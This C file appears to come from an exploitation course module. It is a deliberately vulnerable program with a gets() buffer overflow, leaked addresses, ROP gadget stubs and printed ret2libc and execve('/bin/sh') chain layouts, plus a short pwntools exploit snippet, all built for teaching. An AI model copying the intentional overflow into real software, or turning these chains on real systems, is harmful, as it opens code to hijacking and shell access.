/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development. Usage éducatif uniquement.
 *
 * Module 38 : ROP Chains - Vulnerable Program Demo
 * Compile with: gcc -fno-stack-protector -z execstack -no-pie example.c -o vuln
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Simulated gadgets (normally found with ROPgadget tool)
void gadget_pop_rdi() {
    __asm__("pop %rdi; ret");
}

void gadget_pop_rsi() {
    __asm__("pop %rsi; ret");
}

void gadget_pop_rdx() {
    __asm__("pop %rdx; ret");
}

// Vulnerable function (buffer overflow)
void vulnerable_function() {
    char buffer[64];
    printf("[*] Buffer at: %p\n", buffer);
    printf("[*] Enter payload: ");

    // VULNERABILITY: gets() doesn't check buffer size
    gets(buffer);  // Intentionally unsafe

    printf("[+] Input received: %s\n", buffer);
}

// Win function (simulates successful ROP exploitation)
void win_function() {
    printf("\n[!] WIN! ROP chain executed successfully!\n");
    printf("[+] This simulates arbitrary code execution\n");
    printf("[+] In real exploit: system(\"/bin/sh\") or reverse shell\n");
}

// Print gadget addresses (for manual ROP chain building)
void print_gadgets() {
    printf("\n=== GADGET ADDRESSES (for ROP chain) ===\n");
    printf("[*] pop rdi ; ret   : %p\n", gadget_pop_rdi);
    printf("[*] pop rsi ; ret   : %p\n", gadget_pop_rsi);
    printf("[*] pop rdx ; ret   : %p\n", gadget_pop_rdx);
    printf("[*] win_function    : %p\n", win_function);
    printf("[*] system (libc)   : %p\n", system);
    printf("\n");
}

// Information leak (simulates ASLR bypass)
void leak_addresses() {
    void* stack_addr = &stack_addr;
    void* libc_addr = (void*)system;

    printf("\n=== ADDRESS LEAK (ASLR bypass) ===\n");
    printf("[*] Stack address: %p\n", stack_addr);
    printf("[*] Libc address : %p\n", libc_addr);
    printf("\n");
}

// Demonstrate ret2libc concept
void demo_ret2libc() {
    printf("\n=== RET2LIBC CONCEPT ===\n");
    printf("Stack layout for ret2libc:\n");
    printf("  [padding]       // 72 bytes to overwrite saved RBP\n");
    printf("  [pop_rdi_addr]  // Gadget: pop rdi ; ret\n");
    printf("  [\"/bin/sh\"]     // Argument for system()\n");
    printf("  [system_addr]   // Call system(\"/bin/sh\")\n");
    printf("\n");
}

// Demonstrate ROP chain concept
void demo_rop_chain() {
    printf("\n=== ROP CHAIN CONCEPT ===\n");
    printf("ROP chain for execve(\"/bin/sh\", NULL, NULL):\n");
    printf("  [padding]       // Overflow to RIP\n");
    printf("  [pop_rdi_ret]   // rdi = \"/bin/sh\"\n");
    printf("  [\"/bin/sh\"]  \n");
    printf("  [pop_rsi_ret]   // rsi = NULL\n");
    printf("  [0x0]           \n");
    printf("  [pop_rdx_ret]   // rdx = NULL\n");
    printf("  [0x0]           \n");
    printf("  [pop_rax_ret]   // rax = 59 (execve)\n");
    printf("  [59]            \n");
    printf("  [syscall_ret]   // Execute syscall\n");
    printf("\n");
}

int main(int argc, char* argv[]) {
    printf("\n⚠️  AVERTISSEMENT : ROP exploitation demo\n");
    printf("   Usage éducatif uniquement. VM isolée.\n\n");

    if (argc > 1 && strcmp(argv[1], "--demo") == 0) {
        // Educational demonstration mode
        print_gadgets();
        leak_addresses();
        demo_ret2libc();
        demo_rop_chain();

        printf("[*] To exploit manually:\n");
        printf("    1. Use ROPgadget to find gadgets\n");
        printf("    2. Build ROP chain with pwntools\n");
        printf("    3. Send payload to vulnerable_function()\n");
        printf("\n");
        printf("[!] Example exploit with pwntools:\n");
        printf("    from pwn import *\n");
        printf("    p = process('./vuln')\n");
        printf("    payload = b'A'*72 + p64(win_addr)\n");
        printf("    p.sendline(payload)\n");
        printf("\n");

        return 0;
    }

    // Vulnerable execution mode
    printf("=== VULNERABLE PROGRAM (Buffer Overflow) ===\n\n");

    leak_addresses();  // Help attacker (ASLR bypass in real exploit)
    print_gadgets();   // Show gadgets (normally found with tools)

    printf("[!] WARNING: This program has intentional buffer overflow\n");
    printf("[!] Input > 64 bytes will overwrite return address\n");
    printf("[!] Exploit this to call win_function() via ROP\n\n");

    vulnerable_function();

    printf("\n[+] Program exited normally\n");
    printf("[!] If you saw WIN message, ROP exploit succeeded!\n");

    return 0;
}
